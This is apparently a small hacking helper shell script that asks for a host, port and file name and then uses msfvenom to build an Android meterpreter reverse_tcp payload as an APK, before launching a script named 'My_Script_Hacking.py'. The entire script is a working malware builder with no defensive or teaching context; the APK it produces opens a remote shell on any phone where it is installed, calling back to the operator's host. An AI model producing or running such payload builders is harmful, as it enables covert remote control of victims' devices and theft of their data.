
#=======<>=======#

echo ' Enter Your Host: '
read host

#=======<>=======#

echo ' Enter Your Port: '
read port

#=======<>=======#

echo ' Enter Your Name: '
read name

#=======<>=======#

msfvenom -p android/meterpreter/reverse_tcp lhost=$host lport=$port R> $name.apk
clear
python3 My_Script_Hacking.py

#=======<>=======#
